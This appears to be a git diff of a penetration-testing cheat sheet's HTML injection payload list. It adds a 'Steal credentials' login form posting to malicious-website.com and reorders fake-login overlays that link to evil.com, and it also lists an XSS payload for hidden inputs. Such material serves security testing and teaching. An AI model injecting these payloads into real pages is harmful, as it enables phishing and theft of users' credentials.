@@ -729,11 +729,15 @@ Manually testing for XXE vulnerabilities generally involves
 ### Payloads
 
 - HTML injection
-  - ```HTML
-    <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
+  - Steal credentials
+    ```HTML
+    <form action="http://malicious-website.com/steal-credentials" method="post"><label for="username">Username:</label><input type="text" id="username" name="username"><br><label for="password">Password:</label><input type="password" id="password" name="password"><br><input type="submit" value="Log In"></form>
     ```
   - ```HTML
     <div style="background-color:white;position:fixed;width:100%;height:100%;top:0px;left:0px;z-index:1000;margin: auto;padding: 10px;"><p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a></div>
+    ```
+  - ```HTML
+    <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
     ```
 - [For hidden inputs](https://portswigger.net/research/xss-in-hidden-input-fields): `accesskey="X" onclick="alert(1)"` then Press ALT+SHIFT+X on Windows / CTRL+ALT+X on OS X
   - See also this article: ["Exploiting XSS in hidden inputs and meta tags" by Gareth Heyes](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)
